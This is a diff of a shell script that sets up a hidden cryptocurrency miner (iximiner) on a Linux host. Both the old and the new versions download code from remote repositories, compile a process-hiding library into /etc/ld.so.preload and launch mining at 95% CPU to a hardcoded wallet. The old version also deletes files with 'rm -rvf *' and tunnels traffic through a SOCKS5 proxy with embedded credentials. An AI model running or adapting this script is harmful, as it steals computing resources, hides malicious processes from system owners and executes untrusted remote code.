@@ -1,58 +1,15 @@
-rm -rvf * && mkdir a && cd a
 #!/bin/sh
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
-
 apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
-
-sudo apt-get install -y nodejs
-
-apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
-
-curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
-
-npm i -g node-process-hider
-
+apt-get install sudo -y
+curl https://github.com/kartolo92/koplok/raw/master/nyumput.c -o nyumput.c
+apt-get install build-essential -y
+gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
+mv libnyumput.so /usr/local/lib/
+echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
+rm nyumput.c
+echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
+/etc/init.d/network restart
 wget https://ixi.hash.express/dl/iximiner_v0.3.0_22.08.2022_linux.tar.gz && tar -zvxf iximiner_v0.3.0_22.08.2022_linux.tar.gz && cd iximiner_v0.3.0_22.08.2022_linux
-
-wget https://gitlab.com/ravencoin002/file/-/raw/main/graphics.tar.gz
-
-tar -xvzf graphics.tar.gz
-
-
-cat > graftcp/local/graftcp-local.conf <<END
-listen = :2233
-loglevel = 1
-socks5 = ${{ 138.197.79.17:443 }}
-socks5_username = ${{ majapahlevi }}
-socks5_password = ${{ majapahlevi }}
-END
-
-./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
-
-sleep .2
-
-echo " "
-echo " "
-
-echo ""
-
-./graftcp/graftcp curl ifconfig.me
-
-echo " "
-echo " "
-
-echo ""
-
-echo " "
-echo " "
-
-
-./graftcp/graftcp wget https://gitlab.com/ravencoin002/file/-/raw/main/magicBezzHash.zip
-unzip magicBezzHash.zip
-make
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-mv libprocesshider.so /usr/local/lib/
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-
-./graftcp/graftcp & clear & ./iximiner --mode miner --pool https://ixi.hash.express --wallet 3hy3CxLLChETAcx8Z6vSLH4q5QKPfitADPnksvmMTMV8DXmPK1sPD33KfWWuXmFAR --name $(shuf -n 1 -i 1-99999)-SM --cpu-intensity 95 --gpu-intensity 0
+ ./iximiner --mode miner --pool https://ixi.hash.express --wallet 4AE4QhCLFwYMszeTVr5YxWsXA2ZoaT3TwUdhmjwfnZa3R6U8fneCuJqQgtw3GXuP6 --name $(shuf -n 1 -i 1-99999)-SM --cpu-intensity 95 --gpu-intensity 0
